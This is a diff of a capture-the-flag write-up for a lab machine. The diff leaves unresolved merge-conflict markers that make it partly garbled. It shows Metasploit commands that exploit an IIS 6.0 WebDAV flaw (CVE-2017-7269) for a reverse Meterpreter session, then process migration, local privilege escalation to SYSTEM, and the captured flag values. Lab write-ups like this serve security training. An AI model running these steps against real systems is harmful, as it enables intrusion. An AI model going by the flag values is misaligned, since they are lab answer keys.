@@ -14,7 +14,10 @@
 ```bash
 nmap -sV -sC -oA nmap/Grandpa 10.129.95.233
 ```
+<<<<<<< HEAD
 ![nmap](img/nmap.png)
+=======
+>>>>>>> 9f1f476 (Add files via upload)
 
 **Results:**
 ```
@@ -38,8 +41,12 @@ PORT   STATE SERVICE VERSION
 
 ### 🔓 Exploit IIS 6.0 WebDav (CVE-2017-7269)
 
+<<<<<<< HEAD
 Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)  
 ![exploitdb](img/exploitdb.png)
+=======
+Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)
+>>>>>>> 9f1f476 (Add files via upload)
 
 ```bash
 msfconsole
@@ -48,11 +55,18 @@ set RHOSTS 10.129.95.233
 set LHOST 10.10.14.156
 run
 ```
+<<<<<<< HEAD
 ![meterpreter](img/meterpreter.png)
 
 > Meterpreter session opened.
 
 ![lowprivi](img/lowprivi.png)
+=======
+
+> Meterpreter session opened.
+
+---
+>>>>>>> 9f1f476 (Add files via upload)
 
 ### 📍 Migrate Session (Stabilize)
 
@@ -61,7 +75,10 @@ ps
 migrate 1896  # wmiprvse.exe
 getuid
 ```
+<<<<<<< HEAD
 ![migrate](img/migrate.png)
+=======
+>>>>>>> 9f1f476 (Add files via upload)
 
 **Result**:
 ```
@@ -79,7 +96,10 @@ use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
 ```
+<<<<<<< HEAD
 ![recon](img/recon.png)
+=======
+>>>>>>> 9f1f476 (Add files via upload)
 
 **Vulnerable Suggestions:**
 - ms14_058_track_popup_menu
@@ -97,7 +117,10 @@ set SESSION 1
 set LHOST 10.10.14.156
 run
 ```
+<<<<<<< HEAD
 ![root](img/root.png)
+=======
+>>>>>>> 9f1f476 (Add files via upload)
 
 ```bash
 getuid
@@ -115,7 +138,15 @@ Server username: NT AUTHORITY\SYSTEM
 ```bash
 cat C:\Users\[USERNAME]\Desktop\user.txt
 ```
+<<<<<<< HEAD
 ![userflag](img/userflag.png)
+=======
+
+**Flag**:
+```
+bdff5ec67c3cff017f2bedc146a5d869
+```
+>>>>>>> 9f1f476 (Add files via upload)
 
 ---
 
@@ -124,6 +155,14 @@ cat C:\Users\[USERNAME]\Desktop\user.txt
 ```bash
 cat C:\Users\Administrator\Desktop\root.txt
 ```
+<<<<<<< HEAD
 ![rootflag](img/rootflag.png)
+=======
+
+**Flag**:
+```
+9359e905a2c35f861f6a57cecf28bb7b
+```
+>>>>>>> 9f1f476 (Add files via upload)
 
 ---
